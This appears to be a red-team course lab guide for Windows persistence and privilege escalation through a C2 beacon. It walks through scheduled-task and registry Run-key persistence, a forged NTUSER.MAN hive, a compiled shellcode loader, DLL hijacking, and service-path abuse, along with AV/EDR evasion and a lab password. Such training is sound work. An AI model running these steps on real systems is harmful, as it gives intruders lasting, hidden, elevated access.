# LAB 5 — Persistence & Privilege Escalation

> Privilege Escalation Parts 1 & 2 require Windows service-specific binaries. Use `svc_agent_tcp9001.x64.exe` processed with Beatrice to avoid AV/EDR detection. Privilege Escalation Parts 1 & 2 cannot run simultaneously — stop services between parts or create additional TCP listeners with associated payloads.

---

## Task 1 — User Persistence

User persistence Parts 1–4 are guided with the last task left to the operator to figure out. A restart is required to confirm most user persistence tasks.

### Part 1 — Scheduled Task

```bash
beacon> help persistask
beacon> schtasksenum ""
```

- Review existing scheduled tasks (output is XML-like — view in VSCode for readability):
    - Find & replace `--------------------------------` with nothing
    - Search for `Name:` to get a list of task names
    - Search for `Command>` to see what each task executes
    - Search for `%localappdata%` to find user-writable paths

- Copy a working payload to a logical location with a logical name, then create the persistence task:
```bash
beacon> persistask add <TASK NAME> <PATH TO PAYLOAD>
```

### Part 2 — NTUSER.MAN Registry Hive

- Copy `reflectra.exe` to a `AdobeSync.exe`:
```bash
beacon> cp C:\Users\seth.hawkins\Desktop\reflectra.exe C:\Users\seth.hawkins\Desktop\AdobeSync.exe
```

- Export the HKCU registry hive:
```bash
beacon> shell reg export HKCU C:\DevTools\HKCU.reg
```  

- On the Windows 11 VM, open `C:\DevTools\HKCU.reg` in `VSCode` and search for `\CurrentVersion\Run`. Add an entry for your payload:  

> **Note:** The Windows 11 VM is used in the lab, this would be completed on an attacker controlled machine  

```
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"OneDrive"="\"C:\\Users\\seth.hawkins\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background"
"AdobeSynchronizer"="\"C:\\Users\\seth.hawkins\\Desktop\\AdobeSync.exe\""
```

> **Note:** If you miss the escaped `\\` in the path you will need to login as vagrant and remove the file.

- Convert the edited `.reg` file to an `NTUSER.MAN` hive using one of the following:
```powershell
cd C:\DevTools

# Option 1
.\HiveSwarming.exe --from reg --to hive .\HKCU.reg NTUSER.MAN

# Option 2
.\swarmer.exe HKCU.reg NTUSER.MAN
```

- Copy `NTUSER.MAN` to the user profile:
```bash
beacon> cp C:\DevTools\NTUSER.MAN C:\Users\seth.hawkins\NTUSER.MAN
```

### Part 3 — Phantom Persistence

```bash
cd ~/CS26AdaptixClass/labs/LAB5
python3 PhantomPersistence.py ~/AdaptixProjects/<YOUR PROJECT>/Payloads/crystal_agent.x64.bin
x86_64-w64-mingw32-gcc -o phantom.exe phantompersist.c -luser32 -ladvapi32 -mwindows -DUNICODE -D_UNICODE
```

- Execute the payload on WS01:
```bash
beacon> upload /path/to/phantom.exe C:\Users\seth.hawkins\Desktop\phantom.exe
beacon> powershell Start-Process C:\Users\seth.hawkins\Desktop\phantom.exe
```

- Wait for the callback on AdaptixC2 — it will take over one minute
- Once it calls back, set sleep to 300s:
```bash
beacon> sleep 300s
```

> **Note:** This is a modified version of the original POC. It is functional but may require multiple attempts to succeed.

### Part 4 — AutoRun Registry

Using information from the previous parts, exploit the Registry AutoRun entry. Use `cacls` and `noconsolation` to determine permissions. This is both persistence and a privilege escalation path if an administrative user logs in.

---

### Part 5 — Validating Persistence

Some persistence mechanisms trigger on restart, others on interactive login — test both.

**Restart WS01** to validate boot and logon-triggered persistence. The beacon session will drop when the machine reboots — wait for WS01 to come back up and confirm the beacon re-establishes automatically:
```bash
beacon> shell shutdown /r /t 15
```

**Log out and log back in** as `seth.hawkins` (password: `ChangeMe1234!@#$` from LAB 4) to validate persistence that requires an interactive user session. Confirm the expected processes or registry entries are active after login.

---

## Task 2 — Privilege Escalation

### Part 1 — DLL Hijack

Review the attached blog post:
```bash
firefox ~/CS26AdaptixClass/labs/LAB5/printworks_medium_article.pdf
```

- On Kali, generate the DLL payload:
```bash
cd ~/CS26AdaptixClass/labs/LAB5
python3 gendll.py
python3 gendll.py ~/AdaptixProjects/<YOUR PROJECT>/Payloads/tcp_9001_agent.x64.bin
x86_64-w64-mingw32-gcc -shared -o payload.dll generated_xor_dll.c
```

- Identify paths the current user can write to that will trigger the DLL hijack using `cacls` or SDDL converters
- Identify the service state and available actions using `sc_*` BOFs (use `.` for local host)
- Upload the DLL, restart the service, and link to the new beacon:
```bash
beacon> help link
```

### Part 2 — Unquoted Service Path

Using information from LAB 4, exploit the unquoted service path vulnerability.

### Part 3 — Modifiable Service

Using information from LAB 4, exploit the modifiable service. Use `noconsolation` with `C:\DevTools\accesschk64.exe` to confirm access, then use `sc_config` to reconfigure the service binary path. Create a `SMB Service EXE` so that it will interfere with `Port 9001`

---
